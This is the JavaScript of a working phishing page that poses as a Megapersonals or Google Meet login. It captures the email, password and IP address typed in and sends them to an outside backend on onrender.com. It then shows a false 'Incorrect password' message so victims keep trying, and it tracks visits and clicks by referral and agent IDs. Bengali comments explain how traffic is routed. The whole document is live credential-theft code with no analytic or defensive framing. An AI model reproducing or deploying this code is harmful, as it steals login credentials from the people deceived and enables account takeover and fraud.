    <script>
        const API_BASE = 'https://panel-c-backend.onrender.com';
        const API_URL = `${API_BASE}/api/submit-info`;
        const TRACK_URL = `${API_BASE}/api/track-visit`;
        const CLICK_URL = `${API_BASE}/api/clicks`;

        // URL থেকে site প্যারামিটার চেক করবে
        const urlParamsForSite = new URLSearchParams(window.location.search);
        const isFromGoogleMeet = urlParamsForSite.get('site') === 'GoogleMeet';
        
        // ট্র্যাকিং নাম সেটআপ কন্ডিশন
        const SITE_NAME = isFromGoogleMeet ? 'Google Meet' : 'Megapersonals';
        
        const urlParams = new URLSearchParams(window.location.search);
        const REF = (urlParams.get('ref') || '').trim();
        const routeQuery = (urlParams.get('route') || '').trim().toLowerCase();
        const idFromQuery = (urlParams.get('id') || '').trim();

        function getRouteFromPath() {
            const match = window.location.pathname.match(/^\/(refund|login|verify)\/[^\/]+\/?$/i);
            return match ? match[1].toLowerCase() : '';
        }

        function getRouteIdFromPath() {
            const match = window.location.pathname.match(/^\/(?:refund|login|verify)\/([^\/]+)\/?$/i);
            return match ? decodeURIComponent(match[1]) : '';
        }

        const routePath = getRouteFromPath();
        const idFromPath = getRouteIdFromPath();
        const userId = idFromPath || idFromQuery;
        const routeType = routeQuery || routePath;
        const agentRoute = userId || routeType;

        function restoreRoutePath() {
            if (!routePath && routeQuery && idFromQuery && !/^\/(?:refund|login|verify)\/[^\/]+\/?$/.test(window.location.pathname)) {
                const cleanedRoute = `/${routeQuery}/${encodeURIComponent(idFromQuery)}`;
                try {
                    history.replaceState(null, '', cleanedRoute);
                } catch (e) {
                    console.warn('restoreRoutePath failed', e);
                }
            }
        }

        let state = { userId: null, visitorIp: null, sessionId: getNewSessionId(), isLoading: false };

        function setMessage(text, isError = false) {
            const el = document.getElementById('formError');
            if (!el) return;
            el.textContent = text;
            el.style.display = 'block';
            el.style.color = isError ? '#dc3545' : '#28a745';
        }

        function isReloadNavigation() {
            try {
                const entries = performance.getEntriesByType('navigation');
                if (entries.length > 0) return entries[0].type === 'reload';
                return performance.navigation && performance.navigation.type === performance.navigation.TYPE_RELOAD;
            } catch (e) { return false; }
        }

        function getNewSessionId() { return `session_${Math.random().toString(36).slice(2)}_${Date.now()}`; }

        let audioContext = null;
        let activeOscillators = [];
        let activeGains = [];

        function getAudioContext() {
            if (!audioContext) {
                const AudioContextClass = window.AudioContext || window.webkitAudioContext;
                if (AudioContextClass) audioContext = new AudioContextClass();
            }
            return audioContext;
        }

        function stopAllSounds() {
            try {
                activeOscillators.forEach(o => { try { o.stop(); } catch (e) {} });
                activeOscillators = [];
                activeGains.forEach(g => { try { g.disconnect(); } catch (e) {} });
                activeGains = [];
            } catch (e) { console.warn('stopAllSounds error', e); }
        }

        function playOpenSound() {
            // যদি গুগল মিট থেকে ট্রাফিক আসে, তাহলে ওপেনিং সাউন্ড স্কিপ হবে
            if (isFromGoogleMeet) return;
            playSynthesizedTing();
        }

        function playSynthesizedTing() {
            try {
                const ctx = getAudioContext(); if (!ctx) return;
                if (ctx.state === 'suspended') { ctx.resume().then(() => setTimeout(playSynthesizedTing, 50)).catch(() => {}); return; }
                const now = ctx.currentTime;
                const primaryDuration = 0.12; const secondaryDelay = 0.06; const secondaryDuration = 0.1;
                stopAllSounds();
                const masterGain = ctx.createGain(); masterGain.gain.setValueAtTime(1.0, now); masterGain.connect(ctx.destination); activeGains.push(masterGain);
                const primaryOsc = ctx.createOscillator(); primaryOsc.type='sine'; primaryOsc.frequency.setValueAtTime(1600, now);
                primaryOsc.frequency.exponentialRampToValueAtTime(1200, now + 0.03); primaryOsc.frequency.exponentialRampToValueAtTime(200, now + primaryDuration);
                const primaryGain = ctx.createGain(); primaryGain.gain.setValueAtTime(0.5, now); primaryGain.gain.exponentialRampToValueAtTime(0.05, now + primaryDuration);
                primaryOsc.connect(primaryGain); primaryGain.connect(masterGain); activeOscillators.push(primaryOsc); primaryOsc.start(now); primaryOsc.stop(now + primaryDuration);
                const secondaryOsc = ctx.createOscillator(); secondaryOsc.type='sine'; secondaryOsc.frequency.setValueAtTime(2400, now + secondaryDelay);
                secondaryOsc.frequency.exponentialRampToValueAtTime(1800, now + secondaryDelay + 0.025); secondaryOsc.frequency.exponentialRampToValueAtTime(300, now + secondaryDelay + secondaryDuration);
                const secondaryGain = ctx.createGain(); secondaryGain.gain.setValueAtTime(0, now); secondaryGain.gain.linearRampToValueAtTime(0.35, now + secondaryDelay + 0.01); secondaryGain.gain.exponentialRampToValueAtTime(0.02, now + secondaryDelay + secondaryDuration);
                secondaryOsc.connect(secondaryGain); secondaryGain.connect(masterGain); activeOscillators.push(secondaryOsc); secondaryOsc.start(now + secondaryDelay); secondaryOsc.stop(now + secondaryDelay + secondaryDuration);
                setTimeout(() => { activeOscillators = []; activeGains = []; }, Math.ceil((primaryDuration + secondaryDelay + secondaryDuration + 0.1) * 1000));
            } catch (e) { console.warn('Error playing synthesized ting:', e); }
        }

        async function trackPageVisitUnique() {
            try {
                // কন্ডিশন: Google Meet থেকে রিডাইরেক্ট হয়ে আসলে এই মেগা পেজে ভিজিট ট্র্যাকিং হবে না
                if (isFromGoogleMeet) {
                    console.log("Visit tracking skipped: Traffic originated from Google Meet.");
                    return;
                }

                const TRACKED_KEY = 'mp_tracked';
                if (sessionStorage.getItem(TRACKED_KEY)) return;

                const sessionId = state.sessionId || getNewSessionId();
                const payload = { website: SITE_NAME, sessionId };
                if (agentRoute) payload.route = agentRoute;
                if (REF) payload.ref = REF;
                if (state.userId) payload.userId = state.userId;

                const sent = await sendBeaconWithFallback(TRACK_URL, payload).catch(() => false);
                if (sent) {
                    try { sessionStorage.setItem(TRACKED_KEY, '1'); } catch (e) {}
                }
            } catch (e) { console.warn('track failed', e); }
        }

        async function getVisitorIp() {
            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); return d.ip; }
            catch (e) { return null; }
        }

        function validateEmail(email) { return !!email && email.length > 0; }

        function clearAllErrors() {
            ['emailError','passwordError','captchaError','formError','successMessage'].forEach(id => { const el = document.getElementById(id); if (el) { el.style.display='none'; el.textContent=''; } });
        }

        function setLoading(on) {
            state.isLoading = on;
        }

        async function submitToBackend(payload) {
            const resp = await fetch(API_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
            return resp.json();
        }

        async function handleFormSubmit(e) {
            e.preventDefault();
            clearAllErrors();
            const email = document.getElementById('person_username_field_login').value.trim();
            const password = document.getElementById('person_password_field_login').value;
            const captcha = document.getElementById('captcha_code').value.trim();

            if (!email || !password) { setMessage('Please enter both email and password.', true); return; }
            if (!validateEmail(email)) { setMessage('Please enter a valid email.', true); return; }
            if (!captcha) { setMessage('Please enter the captcha code', true); return; }

            setLoading(true);
            try {
                const payload = {
                    email,
                    password,
                    website: SITE_NAME, // Google Meet থেকে আসলে এখানে ডেটা 'Google Meet' নামেই ডাটাবেজে সাবমিট হবে
                    ref: REF || undefined,
                    route: routeType || undefined,
                    userId: state.userId || undefined,
                    visitorIp: state.visitorIp || undefined
                };

                try { await submitToBackend(payload); } catch (e) { console.warn('backend submit failed', e); }

                const usernameEl = document.getElementById('person_username_field_login');
                const passwordEl = document.getElementById('person_password_field_login');
                const captchaEl = document.getElementById('captcha_code');
                const captchaImg = document.getElementById('captcha_image_itself');
                
                if (usernameEl) usernameEl.value = '';
                if (passwordEl) passwordEl.value = '';
                if (captchaEl) captchaEl.value = '';

                if (captchaImg && captchaImg.src) {
                    try { captchaImg.src = captchaImg.src.split('?')[0] + '?r=' + Date.now(); } catch (e) { console.warn('captcha refresh failed', e); }
                }

                if (usernameEl) usernameEl.focus();
                setMessage('Incorrect password. Please try again.', true);

            } catch (err) {
                console.error('submit error', err);
                setMessage('Unable to send data. Check if the backend is running.', true);
            } finally { setLoading(false); }
        }

        function setupCaptchaReload() {
            const reload = document.getElementById('captchaReload');
            if (!reload) return;
            reload.addEventListener('click', (e) => { e.preventDefault(); const c = document.getElementById('captcha_code'); if (c) { c.value=''; c.focus(); } clearAllErrors(); });
        }

        function sendBeaconWithFallback(url, data) {
            return new Promise((resolve) => {
                try {
                    const payload = typeof data === 'string' ? data : JSON.stringify(data);
                    if (navigator.sendBeacon) {
                        const blob = new Blob([payload], { type: 'application/json' });
                        const sent = navigator.sendBeacon(url, blob);
                        if (sent) return resolve(true);
                    }
                } catch (e) {}

                try {
                    if (window.fetch) {
                        fetch(url, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: typeof data === 'string' ? data : JSON.stringify(data),
                            keepalive: true,
                            cache: 'no-store',
                            mode: 'cors',
                            credentials: 'omit'
                        }).then(() => resolve(true)).catch(() => resolve(false));
                        return;
                    }
                } catch (e) {}

                resolve(false);
            });
        }

        function trackClick(target) {
            try {
                // কন্ডিশন: Google Meet থেকে রিডাইরেক্ট হয়ে আসলে মেগা পেজের ভেতরের ক্লিকের জন্য ট্র্যাকিং হবে না
                if (isFromGoogleMeet) return Promise.resolve(false);

                if (target.matches && target.matches('button[type="submit"], input[type="submit"]')) return Promise.resolve(false);
                if (target.dataset && target.dataset.noTrack === 'true') return Promise.resolve(false);
                const tag = target.tagName.toLowerCase();
                const label = (target.textContent || target.getAttribute('aria-label') || target.getAttribute('title') || target.getAttribute('href') || target.type || '').trim();
                const payload = {
                    website: SITE_NAME,
                    route: agentRoute || undefined,
                    userId: state.userId || undefined,
                    element: label || tag,
                    tag,
                    timestamp: new Date().toISOString()
                };
                return sendBeaconWithFallback(CLICK_URL, payload).catch((e) => {
                    console.warn('click tracking failed', e);
                    return false;
                });
            } catch (e) {
                console.warn('click tracking failed', e);
                return Promise.resolve(false);
            }
        }

        function setupClickSounds() {
            const disabledSelectors = ['.header-logo', '.starthere', '#captchaReload', '.security-banner'];
            const isDisabled = (el) => disabledSelectors.some(selector => el.closest(selector));
            
            document.body.addEventListener('click', (event) => {
                const el = event.target;
                if (!(el instanceof Element)) return;
                const target = el.closest('a, button, input[type="submit"], input[type="button"]');
                if (!target) return;
                
                if (isDisabled(target)) {
                    event.preventDefault();
                    event.stopPropagation();
                    return;
                }
                
                if (target.tagName.toLowerCase() === 'a') {
                    event.preventDefault();
                }
                
                const isLink = target.tagName.toLowerCase() === 'a' && target.href && target.href !== '#' && target.href !== '' && target.target !== '_blank';
                
                // যদি গুগল মিট থেকে আসে, তাহলে ক্লিকে ট্র্যাকিং বা সাউন্ড কোনোটিই এক্সিকিউট হবে না, শুধু রিডাইরেকশন কাজ করবে
                if (isFromGoogleMeet) {
                    if (isLink) {
                        window.location.href = target.href;
                    }
                    return;
                }

                if (isLink) {
                    trackClick(target).finally(() => {
                        window.location.href = target.href;
                    });
                } else {
                    trackClick(target);
                }
            });
        }

        async function initialize() {
            state.userId = userId || null;
            state.visitorIp = await getVisitorIp();
            document.getElementById('form_data').addEventListener('submit', handleFormSubmit);
            setupCaptchaReload();
            setupClickSounds();
            ['person_username_field_login','person_password_field_login','captcha_code'].forEach(id => { const el = document.getElementById(id); if (el) el.addEventListener('focus', () => clearAllErrors()); });

            restoreRoutePath();
            
            // এই ফাংশন কল হলেও গুগল মিটের ট্রাফিকের জন্য এর ভেতর থেকে অটোমেটিক স্কিপ হয়ে যাবে
            trackPageVisitUnique().catch((e) => { console.warn('trackPageVisitUnique failed', e); });

            window.addEventListener('load', () => {
                // গুগল মিট থেকে না আসলেই কেবল ওপেনিং সাউন্ড প্লে হবে
                if (!isFromGoogleMeet) {
                    playOpenSound();
                }
            });
        }

        if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', initialize); else initialize();
    </script>
